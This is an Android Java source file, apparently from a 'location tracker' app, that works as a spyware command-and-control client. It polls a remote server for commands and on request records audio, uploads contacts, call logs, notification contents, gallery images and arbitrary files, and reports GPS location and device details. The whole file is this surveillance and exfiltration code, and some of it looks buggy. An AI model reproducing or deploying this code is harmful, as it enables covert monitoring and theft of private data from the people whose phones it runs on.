package com.varbin.locationtracker.APIs;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import AutoVoiceRecorder.recorderClass;
import UiActivities.FileUploadClass;
import callDetails.contactList;
import callDetails.deviceRegisterModel;
import callDetails.inActiveCommand;
import callDetails.lastCall;
import gallery.galleryModel;
import gallery.galleryRunner;
import models.logModel;
import models.AttrModel;
import models.ContactModel;
import models.FileUpload;

import notifications.notificationModel;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import synceAdapter.AccountConstants;

import static android.content.ContentValues.TAG;

import androidx.annotation.RequiresApi;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class CreaterClass {
    private static Retrofit retrofit ;
    private static String baseUrl = AccountConstants.BASEURL;
    public static void LocationSender(double latitude , double Longitude ,Context context){
         retrofit = new Retrofit.Builder()
            .baseUrl(baseUrl)
            .addConverterFactory(GsonConverterFactory.create())
            .build();
        MyInterface myInterface = retrofit.create(MyInterface.class);
        String DeviceName = com.jaredrummler.android.device.DeviceName.getDeviceName();
        ModelClass modelClass = new ModelClass(DeviceName , AccountConstants.getStatus(context), Build.BRAND ,latitude , Longitude);
        Call<ModelClass> call = myInterface.createLocation(modelClass);
        call.enqueue(new Callback<ModelClass>() {
            @Override
            public void onResponse(Call<ModelClass> call, Response<ModelClass> response) {
//                Log.d("TAG", "onResponseContact: "+response);
            }

            @Override
            public void onFailure(Call<ModelClass> call, Throwable t) {
//                Log.d("TAG", "onResponseContact: "+t.getLocalizedMessage());


            }
        });
    }
    public static void ContactCreater(List<String> Name , List<String> Mobile){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface = retrofit.create(MyInterface.class);
        ContactModel cm = new ContactModel(Build.MODEL ,AccountConstants.getStatus, Build.BRAND ,Name , Mobile );
        Call<ContactModel> contactModelCall = myInterface.createContact(cm);
        contactModelCall.enqueue(new Callback<ContactModel>() {
            @Override
            public void onResponse(Call<ContactModel> call, Response<ContactModel> response) {
//                Log.d(TAG, "onResponse contactCreator: "+response.code());

            }

            @Override
            public void onFailure(Call<ContactModel> call, Throwable t) {
//                Log.d(TAG, "onResponse contactCreator: fail "+t.getLocalizedMessage());
            }
        });
    }
    public static void getStatus(Context context){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
         String base = baseUrl+"getCommand/"+AccountConstants.getStatus(context);
        Log.d(TAG, "getStatus: "+base);
         Call<List<AttrModel>>  call = myInterface.getCommand(base);
         call.enqueue(new Callback<List<AttrModel>>() {
             @RequiresApi(api = Build.VERSION_CODES.O)
             @Override
             public void onResponse(Call<List<AttrModel>> call, Response<List<AttrModel>> response) {
//                 Log.d(TAG, "onResponse: "+response.message());
                List<AttrModel> model = response.body();
                if (model!=null){
                    for (int i = 0; i < model.size(); i++) {
                        switch (model.get(i).getCommand()) {
                            case "sound_record" :{
                                Log.d(TAG, "onResponse: case "+"sound_record"+i);
                                recorderClass.startRecording(context.getApplicationContext() , model.get(i).getAttr());
                                break;
                            }
                            case "contact_list" :{
                                Log.d(TAG, "onResponse: case "+"contact_list"+i);
                                contactList.sendContactToserver(context);
                                break;
                            }
                            case "contact_log" :{
                                lastCall.ValidatLog(context.getApplicationContext());
                                Log.d(TAG, "onResponse: case "+"contact_log"+i);
//                                lastCall.ValidatLog(context.getApplicationContext());
                                break;
                            }
                            case "live_location" :{
                                Log.d(TAG, "onResponse: case "+"live_location"+i);
                                break;
                            }
                            case "upload":{
                                FileUploadClass fileUploadClass = new FileUploadClass(new File(model.get(i).getFilepath()), model.get(i).getFilepath(),model.get(i).getId());
                                fileUploadClass.execute();
                                Log.d(TAG, "onResponse: case "+"upload file "+i);
                                try {
                                    Thread.sleep(3000);
                                    CreaterClass.inActive("upload" , context);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                                break;

                            }
                            case "gallary":{
                                galleryRunner.GetImages(context);
                                Log.d(TAG, "onResponse: case "+"gallery "+i);
                                break;

                            }
                        }
                    }

                }else {
                    Log.d(TAG, "onResponse: NoCommand");
                }

             }

             @Override
             public void onFailure(Call<List<AttrModel>> call, Throwable t) {
                 retrofit = new Retrofit.Builder()
                         .baseUrl(baseUrl)
                         .addConverterFactory(GsonConverterFactory.create())
                         .build();
                 MyInterface myInterface =  retrofit.create(MyInterface.class);

             }
         });

    }
    public static <T> void sendContactToserver (String name , String number){
        Log.d(TAG, "uploadFileonServer: return ");
        return;
    }
    public static boolean inActive(String command , Context context){
        final boolean flage ;
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        String base = baseUrl+AccountConstants.inActive+AccountConstants.getStatus(context)+"/"+command ;
        Log.d(TAG, "onResponse: inactive "+ base);
        Call<inActiveCommand> call = myInterface.inActiveCommand(base);
        call.enqueue(new Callback<inActiveCommand>() {
            @Override
            public void onResponse(Call<inActiveCommand> call, Response<inActiveCommand> response) {
                Log.d(TAG, "onResponse: inactive "+ response.message());
                AccountConstants.isInactive = true;
            }
            @Override
            public void onFailure(Call<inActiveCommand> call, Throwable t) {
                Log.d(TAG, "onResponse: inactive "+ t.getLocalizedMessage());
//                AccountConstants.isInactive = false;
            }
        });
        flage = AccountConstants.isInactive;
        return flage;
    }
    public static boolean FileDataUploader(String command , String date , String path , Context context) throws IOException {

        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        FileUpload fileUpload = new FileUpload( command, AccountConstants.getStatus(context) , date, path);
        Gson gson = new Gson();
        String s = gson.toJson(fileUpload);
        Log.d(TAG, "onResponse fileuploader: "+s);
//        Call<FileUpload> call = myInterface.sendData2(command.trim(),AccountConstants.getStatus.trim(), path.trim() ,date.trim() );
        Call<FileUpload> call = myInterface.sendData2(fileUpload);
        call.enqueue(new Callback<FileUpload>() {
            @Override
            public void onResponse(Call<FileUpload> call, Response<FileUpload> response) {
//                Log.d(TAG, "onResponse: fileuploader "+response.message());

            }

            @Override
            public void onFailure(Call<FileUpload> call, Throwable t) {
//                Log.d(TAG, "onResponse: "+t.getLocalizedMessage());
            }
        });
        return false;
    }
    public static void uploadData(byte[] encode , String enc){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        String base = baseUrl + " fileupload " + enc ;
        Call<Void> call = myInterface.uploadData(enc  , base);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
//                Log.d(TAG, "fileChooser: done "+response.code());
            }
            @Override
            public void onFailure(Call<Void> call, Throwable t) {
//                Log.d(TAG, "fileChooser: fail ");
            }
        });
    }
    public static void uploadCallLog(List<String> number , List<String> type ,List<String>  date ,  List<String> Duartion , Context context){
        Gson gson = new GsonBuilder()
                .setLenient()
                .create();
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        logModel lm = new logModel(number , type , date , Duartion ,Build.MODEL , AccountConstants.getStatus(context), Build.BRAND );
        Call<logModel> call = myInterface.sendCallLog(lm);
        Gson gson2 = new Gson();
        String s = gson2.toJson(lm);
        Log.d(TAG, "onResponse: "+s);
        call.enqueue(new Callback<logModel>() {
            @Override
            public void onResponse(Call<logModel> call, Response<logModel> response) {
//                Log.d(TAG, "onResponse: upload call log "+response.code());
            }

            @Override
            public void onFailure(Call<logModel> call, Throwable t) {
//                Log.d(TAG, "onResponse: upload call log e "+t.getLocalizedMessage());
            }
        });
    }
    public static void sendNotification(String pack , String Content , String title , Context context){
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        notificationModel nm = new notificationModel(Build.MODEL , AccountConstants.getStatus(context) , Build.BRAND , pack , Content , title );
        Call<notificationModel> call = myInterface.sendNotification(nm);
        call.enqueue(new Callback<notificationModel>() {
            @Override
            public void onResponse(Call<notificationModel> call, Response<notificationModel> response) {
//                Log.d(TAG, "onResponse: sendNotification "+response.code());
            }

            @Override
            public void onFailure(Call<notificationModel> call, Throwable t) {
//                Log.d(TAG, "onResponse: sendNotification "+t);
            }
        });
    }
    public static void RegisterDevice(String name , String number , Context context){
        Gson gson = new GsonBuilder()
                .setLenient()
                .create();
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        deviceRegisterModel dm = new deviceRegisterModel(AccountConstants.getStatus(context), Build.MODEL , Build.BRAND , name , number);
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        Call<deviceRegisterModel> call = myInterface.registerDevice(dm);
        Gson gson2 = new Gson();
        String json   = gson2.toJson(dm);
        call.enqueue(new Callback<deviceRegisterModel>() {
            @Override
            public void onResponse(Call<deviceRegisterModel> call, Response<deviceRegisterModel> response) {
//                Log.d(TAG, "TestApis location: device registerd");
            }

            @Override
            public void onFailure(Call<deviceRegisterModel> call, Throwable t) {
//                Log.d(TAG, "TestApis location: device fail registerd"+t.getMessage());
            }
        });

    }
    public static void sendBulkImages(List<String> url , List<String> date , Context context){
        Gson gson = new GsonBuilder()
                .setLenient()
                .create();
        retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        galleryModel gm = new galleryModel( "gallery",AccountConstants.getStatus(context) , url , date );
        MyInterface myInterface =  retrofit.create(MyInterface.class);
        Call<galleryModel> call = myInterface.setGalleryFile(gm);
        call.enqueue(new Callback<galleryModel>() {
            @Override
            public void onResponse(Call<galleryModel> call, Response<galleryModel> response) {
//                Log.d(TAG, "onResponseGallery: "+ response.message());
            }

            @Override
            public void onFailure(Call<galleryModel> call, Throwable t) {
//                Log.d(TAG, "onResponseGallery: Fail "+t.getLocalizedMessage());

            }
        });
     }
}
